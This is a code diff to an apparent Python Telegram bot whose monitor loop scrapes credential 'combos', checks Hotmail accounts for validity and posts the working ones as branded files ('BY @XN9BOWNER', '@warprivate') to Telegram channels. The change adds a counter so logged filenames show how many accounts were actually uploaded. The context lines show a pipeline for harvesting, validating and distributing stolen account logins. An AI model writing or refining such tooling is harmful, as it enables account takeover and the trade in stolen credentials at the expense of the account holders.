@@ -843,6 +843,8 @@ async def monitor_loop():
                                     "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                                 )
 
+                                uploaded_count = 0  # Track what actually gets uploaded
+
                                 # Validity check for hotmail — post only valid accounts
                                 if label == "hotmail":
                                     try:
@@ -851,8 +853,10 @@ async def monitor_loop():
                                             valid_fname = f"HOTMAIL {len(valid_accounts)} VALID BY @XN9BOWNER.txt"
                                             await asyncio.wait_for(send_telegram_file(tg_header + "\n".join(valid_accounts), valid_fname), timeout=30)
                                             log.info(f"Posted {len(valid_accounts)} valid hotmail accounts")
+                                            uploaded_count = len(valid_accounts)  # Only valid accounts uploaded
                                         else:
                                             log.info("No valid hotmail accounts found")
+                                            uploaded_count = 0
                                     except asyncio.TimeoutError:
                                         log.error("Timeout during validity check")
                                     except Exception as e:
@@ -864,6 +868,7 @@ async def monitor_loop():
                                         fname = f"{label.upper()} {len(chunk)} BY @XN9BOWNER.txt"
                                         await asyncio.wait_for(send_telegram_file(tg_header + "\n".join(chunk), fname), timeout=30)
                                         await asyncio.sleep(0.5)
+                                        uploaded_count = len(chunk)  # All combos uploaded for non-hotmail
 
                                 # Inbox checker (disabled)
                                 # if label == "hotmail":
@@ -900,8 +905,8 @@ async def monitor_loop():
                                 if toggles["telegram_public"]:
                                     private_post_count_ref = globals()
                                     private_post_count_ref["private_post_count"] += 1
-                                    for chunk in chunks:
-                                        private_post_count_ref["recent_filenames"].append(f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt")
+                                    # Use uploaded_count (actual amount uploaded, not scraped)
+                                    private_post_count_ref["recent_filenames"].append(f"[ {label.upper()} ] [ {uploaded_count} ] [ @warprivate ].txt")
                                     log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
                                     if private_post_count_ref["private_post_count"] >= 2:
                                         private_post_count_ref["private_post_count"] = 0
